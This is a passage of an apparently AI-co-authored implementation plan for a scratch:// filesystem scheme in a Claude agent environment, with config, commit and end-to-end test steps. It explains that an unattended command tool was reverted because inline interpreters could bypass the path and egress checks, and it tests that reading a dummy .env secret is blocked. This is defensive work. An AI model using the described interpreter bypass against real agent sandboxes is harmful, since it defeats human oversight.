# interpreter (python3 -c/perl -e/ruby -e/node -e/awk) computing its own file
# path or performing network I/O at runtime, defeating both the path-deny and
# network-egress checks simultaneously with no human in the loop. Closing
# that gap needs OS-level sandboxing or a non-interpreter executable
# allow-list -- both out of scope here. terminal.run's existing
# human-approval gate remains the only path for arbitrary command execution.
scratch:
  enabled: true
  ttl_hours: 24
```

Note: `enabled` is documentation/intent only in this v1 — no code currently
reads `scratch.enabled` to gate the feature (the design's decision 3/4 puts
enforcement in code, not config toggles). This section only affects the
scratch:// filesystem scheme now that terminal.run_scratch is reverted.

- [ ] **Step 2: Update `README.md`'s Approvals section**

In the existing "### Approvals" section (current lines 575-586), the bullet
list already distinguishes `terminal.run` (approval-gated) from hard-deny
tools. Add a third bullet after the `terminal.run` one (current lines 579-583):

Do NOT add a bullet for `terminal.run_scratch` — it was reverted (see the
plan's Task 3 outcome and the ledger). `terminal.run`'s existing
approval-gated behavior is the only execution path documented here; no
change to this bullet list is needed for this plan. (The scratch:// path
scheme itself, used only by `filesystem.read/write/list`, doesn't need an
Approvals-section mention since it's not an execution surface — it has no
approval gate to describe.)

- [ ] **Step 3: Check whether `CLAUDE.md`'s repo map needs updating**

Read the current "Repo map" section of `CLAUDE.md` (the `mcp-servers/` line).
It currently reads:

```
mcp-servers/            filesystem-policy · git · lancedb-rag · memory-graph · terminal · documentation
```

This line lists the servers, not their runtime-created data directories
(`state/`, `knowledge/`, etc. aren't listed either) — `scratch/` is a
runtime-created directory under `$CLAUDE_ENV_HOME`, not a repo directory, so
no change is needed here. Confirm this by grepping for how `state/` (another
runtime-only directory) is or isn't mentioned:

```bash
grep -n "^state/\|state/" CLAUDE.md
```

If `state/` isn't listed as its own repo-map entry, `scratch/` shouldn't be
either — skip this file. (Expected: no match, confirming the repo map only
lists source directories that exist in the git checkout, not runtime output
directories — `scratch/` follows the same pattern.)

- [ ] **Step 4: Deploy the config change**

```bash
cp -v config/global-policy.yaml ~/.claude-env/config/global-policy.yaml
```

Note: this is a deliberate exception to the "config files are written once
by bootstrap and never overwritten" rule from CLAUDE.md — that rule protects
*machine-local hand-edited values* (like `rag.yaml`'s `model_path`) from
being silently reverted by a routine re-bootstrap. `global-policy.yaml`'s new
`scratch:` section has no machine-local state to protect (it's a pure
feature-flag/TTL default), so a direct `cp` here is safe and appropriate —
just confirm no local edits exist first:

```bash
diff config/global-policy.yaml ~/.claude-env/config/global-policy.yaml
```

If this shows differences beyond the new `scratch:` section, stop and
reconcile manually rather than overwriting.

- [ ] **Step 5: Run the full suite one more time**

```bash
pytest tests/ -q
```
Expected: pass count unchanged from whatever Task 4 left the suite at — this
task touches no test-bearing code (only config + docs).

- [ ] **Step 6: Commit**

```bash
git branch --show-current   # confirm: feat/secure-scratchpad
git add config/global-policy.yaml README.md
git commit -m "$(cat <<'EOF'
Document the scratch:// filesystem scheme's global-policy section

Adds config/global-policy.yaml's scratch: section (enabled flag + TTL
default, matching bootstrap.py's reap_stale_scratch_dirs default), with
a note explaining that the originally-planned terminal.run_scratch
(unattended command execution) was reverted after security review found
its path-confinement approach couldn't contain a general interpreter
(python3 -c/perl -e/etc.) computing its own file path or network calls at
runtime. terminal.run's existing human-approval gate remains the only
path for arbitrary command execution; only the read/write/list scratch
scheme (Tasks 1-2) ships from this plan.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 6: End-to-end verification

**Files:** None modified — this task only runs and observes.

**Interfaces:** None.

Note: `terminal.run_scratch` (originally planned as this plan's Task 3) was
implemented, security-reviewed, and REVERTED — its path-confinement approach
could not contain a general interpreter (`python3 -c`/`perl -e`/etc.)
computing its own file path or network calls at runtime, defeating both the
path-deny and network-egress checks with no human in the loop. This task
verifies what actually ships: `security/command_inspector.py` (Task 1, used
today only by the existing native-tool hook) and the `scratch://` filesystem
scheme (Task 2, read/write/list only — no execution surface). `terminal.run`
is completely unchanged by this plan.

- [ ] **Step 1: Full test suite one final time**

```bash
pytest tests/ -q
```
Expected: 0 failures. Confirm the exact count matches what Task 5 left the
suite at (Tasks 1-2 added tests; Task 3's tests were removed on revert;
Tasks 4-5 add their own).

- [ ] **Step 2: Verify the audit chain is still intact**

```bash
~/.claude-env/venv/bin/python -c "import sys;sys.path.insert(0,'$HOME/.claude-env');from audit.audit_logger import AuditLogger;print(AuditLogger('x',actor='x').verify_chain())"
```
Expected: `(True, None)`.

- [ ] **Step 3: Real end-to-end smoke test — scratch:// filesystem behavior**

```bash
mkdir -p /tmp/scratch-e2e-test/.claude
cd /tmp/scratch-e2e-test
git init -q
cp ~/Downloads/Temp/claude-env-platform/config/repo-policy.template.yaml .claude/repo-policy.yaml
echo "SECRET_KEY=do-not-leak-this" > .env
git add -A && git commit -q -m init

CLAUDE_ENV_REPO_ROOT="$(pwd)" ~/.claude-env/venv/bin/python - <<'PYEOF'
import asyncio, os
async def main():
    env = dict(os.environ)
    env["CLAUDE_ENV_REPO_ROOT"] = os.getcwd()
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    params = StdioServerParameters(
        command=str(os.path.expanduser("~/.claude-env/venv/bin/python")),
        args=["mcp-servers/filesystem-policy/server.py"], env=env, cwd=os.getcwd())
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            # 1. write + read a scratch-local file -- allow-all inside scratch
            w1 = await session.call_tool("filesystem.write",
                {"path": "scratch://notes.txt", "content": "hello scratch"})
            print("1 (expect WROTE):", w1.content[0].text)
            r1 = await session.call_tool("filesystem.read", {"path": "scratch://notes.txt"})
            print("2 (expect hello scratch):", r1.content[0].text)
            # 2. list a non-empty scratch subdirectory (the bug the Task 2 fix
            #    pass closed -- must not error)
            await session.call_tool("filesystem.write",
                {"path": "scratch://sub/f.txt", "content": "x"})
            l1 = await session.call_tool("filesystem.list", {"path": "scratch://sub"})
            print("3 (expect scratch://sub/f.txt):", l1.content[0].text)
            # 3. ordinary repo path unaffected: reading the repo's real .env
            #    still goes through the normal deny check (unchanged behavior)
            r2 = await session.call_tool("filesystem.read", {"path": ".env"})
            print("4 (expect BLOCKED):", r2.content[0].text[:80])
asyncio.run(main())
PYEOF
cd -
rm -rf /tmp/scratch-e2e-test
```

Expected:
1. `1 (expect WROTE): WROTE scratch://notes.txt (13 bytes)`
2. `2 (expect hello scratch): hello scratch`
3. `3 (expect scratch://sub/f.txt): scratch://sub/f.txt`
4. `4 (expect BLOCKED): BLOCKED: policy blocked '.env': ...`

- [ ] **Step 4: Confirm `terminal.run` and the existing native-tool hook are completely unchanged**

```bash
pytest tests/test_terminal_command_chaining.py tests/test_policy_hook_bash.py tests/test_policy_hook_scope_egress.py -v 2>&1 | tail -10
```
Expected: all pass — confirms this plan's net effect on `mcp-servers/terminal/server.py` and `hooks/policy_hook.py` is zero (Task 3's `_run()` signature change was fully reverted; Task 1's extraction into `security/command_inspector.py` is the only change to the native-tool hook, and it's behavior-preserving).

- [ ] **Step 5: Final branch check (no commit needed — this task is verification-only)**

```bash
git branch --show-current   # confirm: feat/secure-scratchpad
git log --oneline -10
```
Expected: branch still `feat/secure-scratchpad`, history shows Tasks 1-2's
commits, Task 3's implementation + fix commits followed by a revert commit,
and Tasks 4-5's commits — nothing pushed (push/PR only when the user
explicitly asks).
